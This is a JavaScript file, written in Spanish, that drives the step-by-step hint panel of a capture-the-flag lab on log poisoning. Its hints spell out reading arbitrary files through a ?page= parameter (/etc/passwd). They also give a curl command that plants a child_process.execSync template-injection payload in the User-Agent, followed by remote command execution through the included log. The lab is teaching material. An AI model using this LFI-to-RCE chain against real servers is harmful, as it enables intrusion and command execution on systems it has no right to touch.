// Guía dinámica del reto de Log Poisoning (Node/JS). Hace polling a /status y
// enciende cada etapa según el progreso real detectado en el log de la sala.
(function () {
  const guia = document.getElementById('guia');
  const room = guia.dataset.room;
  const logpath = guia.dataset.logpath;   // /var/log/lab/<sala>.log
  const host = location.origin;            // tu URL (incluida la del túnel)

  const ETAPAS = [
    {
      key: 'visited',
      titulo: 'Entra a tu intranet',
      objetivo: 'Ya estás dentro si ves tu sala arriba. Navega por "Inicio" y "Acerca de" y mira cómo cambia el parámetro ?page= de la URL.',
      pista: 'El visor carga páginas con <code>?room=' + room + '&page=pages/home.tmpl</code>. Fíjate que hay valores dinámicos (fecha/año): el visor <b>evalúa expresiones</b>.'
    },
    {
      key: 'lfi',
      titulo: 'Lee archivos del sistema',
      objetivo: 'El visor lee el archivo de ?page= sin validarlo. Comprueba que puedes leer cualquier archivo del servidor.',
      pista: 'Abre:<br><code>' + host + '/?room=' + room + '&page=/etc/passwd</code><br>Si ves /etc/passwd, hay lectura arbitraria de archivos.'
    },
    {
      key: 'logIncluded',
      titulo: 'Lee el log de tu sala',
      objetivo: 'La intranet registra cada visita (y tu User-Agent) en un log. Léelo con el visor.',
      pista: 'Abre:<br><code>' + host + '/?room=' + room + '&page=' + logpath + '</code><br>Verás las líneas de tus visitas, con tu User-Agent.'
    },
    {
      key: 'poisoned',
      titulo: 'Envenena el log (payload JS en el User-Agent)',
      objetivo: 'El visor evalúa expresiones ${...} como JavaScript (SSTI), y el log guarda tu User-Agent sin filtrar. Manda una petición cuyo User-Agent sea una expresión que ejecute comandos.',
      pista: 'Desde una terminal (usa tu URL del túnel si aplica):<br>' +
        '<code>curl -A \'${require("child_process").execSync(cmd).toString()}\' "' + host + '/?room=' + room + '"</code><br>' +
        'Eso deja el payload guardado en tu log.'
    },
    {
      key: 'rce',
      titulo: 'Consigue RCE',
      objetivo: 'Ahora que el log contiene la expresión, pídele al visor que lo renderice pasándole un comando con &cmd=. Se ejecutará en el servidor.',
      pista: 'Ejecuta "id":<br><code>' + host + '/?room=' + room + '&page=' + logpath + '&cmd=id</code><br>Deberías ver la salida de <code>id</code> en la página.'
    },
    {
      key: 'solved',
      titulo: 'Obtén la flag y envíala',
      objetivo: 'Tu flag solo se genera ejecutando un programa que no puedes leer (hay que EJECUTARLO; por eso necesitabas RCE). Córrelo con tu sala y pega el FLAG{...} abajo.',
      pista: 'Ejecuta el generador vía tu RCE:<br><code>' + host + '/?room=' + room + '&page=' + logpath + '&cmd=getflag ' + room + '</code><br>Copia el <code>FLAG{...}</code> y valídalo.'
    }
  ];

  const ol = document.getElementById('etapas');
  ETAPAS.forEach((e, i) => {
    const li = document.createElement('li');
    li.className = 'etapa';
    li.id = 'etapa-' + e.key;
    li.innerHTML =
      '<span class="num">' + (i + 1) + '</span>' +
      '<div class="cuerpo">' +
      '<div class="titulo">' + e.titulo + '</div>' +
      '<div class="objetivo">' + e.objetivo + '</div>' +
      '<details class="pista"><summary>Ver pista</summary><div>' + e.pista + '</div></details>' +
      '</div>';
    ol.appendChild(li);
  });

  function pintar(st) {
    let hechas = 0;
    let activaPuesta = false;
    ETAPAS.forEach((e, idx) => {
      const li = document.getElementById('etapa-' + e.key);
      li.classList.remove('done', 'activa');
      if (st[e.key]) {
        li.classList.add('done');
        li.querySelector('.num').textContent = '✓';
        hechas++;
      } else {
        li.querySelector('.num').textContent = idx + 1;
        if (!activaPuesta) { li.classList.add('activa'); activaPuesta = true; }
      }
    });
    document.getElementById('prog').textContent = hechas + '/' + ETAPAS.length;
    document.getElementById('exito').hidden = !st.solved;
  }

  async function refrescar() {
    try {
      const st = await fetch('/status?room=' + encodeURIComponent(room)).then((r) => r.json());
      pintar(st);
    } catch (e) { /* reintenta */ }
  }

  const btn = document.getElementById('flagBtn');
  const inp = document.getElementById('flagInput');
  const msg = document.getElementById('flagMsg');
  btn.addEventListener('click', async () => {
    const flag = inp.value.trim();
    if (!flag) return;
    msg.textContent = 'Validando…';
    try {
      const res = await fetch('/check?room=' + encodeURIComponent(room) + '&flag=' + encodeURIComponent(flag))
        .then((r) => r.json());
      msg.textContent = res.ok ? '✅ ¡Correcto!' : '❌ Flag incorrecta.';
      msg.className = 'flagmsg ' + (res.ok ? 'ok' : 'bad');
      if (res.ok) refrescar();
    } catch (e) {
      msg.textContent = 'Error de red, reintenta.';
    }
  });

  refrescar();
  setInterval(refrescar, 3000);
})();
